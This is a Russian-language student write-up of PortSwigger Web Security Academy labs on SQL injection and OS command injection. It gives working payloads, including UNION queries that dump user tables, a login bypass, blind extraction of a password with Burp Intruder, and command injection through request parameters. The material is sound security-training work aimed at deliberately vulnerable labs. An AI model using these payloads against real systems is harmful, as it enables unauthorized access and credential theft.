# SQLi
## Теория
Есть лекция, семинар, https://portswigger.net/web-security/sql-injection/cheat-sheet
## Apprentice
### [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
Из описания увидели запрос
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Увидели, что в url прокидывается категория, так что простой `category=a' OR released=0--`показывает нам все скрытые элементы (потому что запрос превращается в `SELECT * FROM products WHERE category = 'a' OR released=0--`)

### [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
Максимально просто прокидываем в форму логин `administrator'--`

## Practitioner
### [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
Для начала отправляем запрос в repeater в бурпе.

Ищем куда можно прокидывать вход - находим в url category = X, предполагаем, что это перекинется в запрос вроде `SELECT ... FROM X`. Получается, здесь мы можем выбирать таблицу, но не можем менять, что из нее выбирается, так что получить нужную инфу напрямую не выйдет.

Попробуем написать что-то вроде `SELECT ... FROM X UNION SELECT ... FROM Y`. Y явно будет v$version, поскольку мы хотим получить версию Oracle, в реальности бы пришлось ещё поперебирать. Тогда во второе ... мы хотим закинуть banner, но чисто его мы прокинуть не можем, потому что кол-во столбцов должно совпадать с кол-вом столбцов в изначальной части запроса.

Посмотрим, сколько там столбцов, перебирая количество NULL (пока сервер не перестанет возвращать 200): `' UNION SELECT NULL,NULL FROM dual--`, dual - как раз таблица в Oracle, из которой можно доставать нужные столбцы. 

Подобрали кол-во null-ов, начинаем заменять их строками (можно просто 'a'). Нашли, что в первую и вторую можно прокинуть строку, так что заменяем всё на нужный финальный запрос: `' UNION SELECT banner,'ABC' FROM v$version--`

### [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
По сравнению с предыдущей лабой изменился сервер. В отличие от oracle, после select не обязательно писать from, так что можно просто писать `' UNION SELECT NULL,NULL--`. Это возвращало ошибку, потому что в mysql после -- обязательно идет пробел, так что писать надо `--+` из-за url encoding.

Финальный запрос выглядит так: `category=Gifts' UNION SELECT @@version,'abc'--+`

### [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
Нащупали две текстовые колонки

Через сначала @@version -> 500 и затем version() -> 200 поняли, что работаем с постгресом.

Теперь надо понять название таблицы с пользователями. Командой `category=Pets' UNION SELECT table_name, 'abc' from information_schema.tables--` и затем поиском по результату находим таблицу `users_brsokc`. Название таблицы information_schema.tables узнали из [cheetsheet-a](https://portswigger.net/web-security/sql-injection/cheat-sheet).

Теперь надо найти имена колонок с логином и паролем. Командой `category=Pets' UNION SELECT column_name, 'abc' from information_schema.columns where table_name='users_brsokc'--` находим `username_mgmxdo` и `password_axygtx`.

Собираем это в один конструктор: 
`category=Pets' UNION SELECT username_mgmxdo, password_axygtx from users_brsokc--`

Реально сработало! Получаем логин `administrator` и пароль `9g9luol1ek9og46n91yl`. 

### [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
Судя по описанию, клон предыдущей лабы, но на оракле. Погнали.

| Команда                                                                              | Что получили                         |
| ------------------------------------------------------------------------------------ | ------------------------------------ |
| UNION SELECT table_name,NULL FROM all_tables--                                       | USERS_BNCBVU                         |
| UNION SELECT column_name,NULL FROM all_tab_columns where table_name='USERS_BNCBVU'-- | USERNAME_ITNCAU : PASSWORD_ERTPVT    |
| UNION SELECT USERNAME_ITNCAU,PASSWORD_ERTPVT FROM USERS_BNCBVU--                     | administrator : 7m65kih2xnhq8wooas4f |
Это было очень весело, мне нравится.

### [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
Че-то я не в том порядке пошел, я этим активно пользовался до этого. Ну ладно, простым `category=Pets' UNION SELECT NULL,NULL,NULL-- `

### [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
`UNION SELECT NULL,'dVbRpo',NULL--`

### [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
`UNION SELECT password,'tag' from users where username='administrator'--`

### [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
Вообще, это можно было сделать без склеивания, командой `UNION SELECT NULL,password from users WHERE username='administrator'--`. Но, во-первых, не так удобно искать пароль среди кучи строк вывода, и плюс мы так сливаем не всю БД, а только пароль админа.

Так что используем следующую команду: `UNION SELECT NULL,username||':'||password from users--`. Не забываем разделитель, здесь для красоты и следования стандарту, это `:`.

### [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
Понимаем, что SQLi в cookie TrackingId. Для меня это `TrackingId=KDsVKAQdujY9wZiO`

Попробуем прокинуть туда кавычку, наш любимый детектор sqli. 500 не ловим, но видим, что пропала надпись 'Welcome back'. Значит ли это, что оно проверяет на соответствие одной из записей в бд? Не узнаем, пока не попробуем прокинуть `TrackingId=KDsVKAQdujY9wZiO' and 1=1--`. И надпись действительно вернулась!!!!

Значит, наш sqli работает, погнали пытаться вытащить ~~мозг через нос~~ пароль через SQLi: пропишем команду `TrackingId=KDsVKAQdujY9wZiO' and (SELECT 'a' FROM users LIMIT 1)='a'--` и таким образом поймем, что существует таблица users. Затем добавим `where username='administrator` вместо лимита и поймем, что существует такой пользователь.

Пойдем проверять длину пароля: `TrackingId=KDsVKAQdujY9wZiO' and (SELECT 'a' FROM users where username='administrator' and LENGTH(password)>2)='a'--` возвращает истину. Бинарным поиском доходим прыгаем к 32 -> false; 16 -> true и в итоге находим длину 20.

Такое мы вручную не переберем, так что воспользуемся интрудером!! (ура, новый друг). Перекинем туда запрос через rightlick->send to intruder. Напишем `TrackingId=KDsVKAQdujY9wZiO' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--` и окружим `a` знаками параграфа. Затем в payloads добавим alphanumeric characters в соответствие с заданием (к сожалению, не из удобного списка, мне вышка не оплатила бурп). 

Затем в настройках атаки выберем Grep - match, выделим и уберем все варианты и добавим Welcome back.

Можем запускать! В первом видим, что успех получили при значении первого символа `3`. Но нам что, правда вручную 20 раз менять положение подстроки? Разумеется, не для такого мама гения растила, так что я пошел ~~смотреть Community solutions~~ медитировать в горах, пока я не узнал про cluster bomb.

Меняем тип атаки на него, и первую единичку в нашей substring тоже помечаем параграфом и ставим для перебора Numbers (даже не требует про версию, вау), начиная с 2 и заканчивая 20 (капец, я забыл, что нам так много нужно) .

Показать только версии с Welcome back нам не-pro версия не даст, но хотя бы можно отсортировать по убыванию этого столбца и сверху будут только значения с единичкой. Жестко ждем, пока ~~нас ratelimitнут~~ все 20 символов найдутся



# OS Command Injection
## Apprentice
### [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
Просто пытаемся запайпить команду к существующим аргументам: `productId=1|whoami&storeId=1`
## Practitioner
### [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
В [гайде](https://portswigger.net/web-security/os-command-injection) видим, что delay можно вызвать командой ``& ping -c 10 127.0.0.1 &``

Смотрим на запрос сабмита фидбека: `csrf=8a0UOlubEw9VYtIBnJYofpSaqTA5ZybP&name=a&email=a%40a&subject=a&message=a`. Попробуем попайпить нашу команду в разные аргументы, пока не сработает. Получаем `csrf=8a0UOlubEw9VYtIBnJYofpSaqTA5ZybP&name=a&email=a%40a||ping -c 10 127.0.0.1||&subject=a&message=a`.

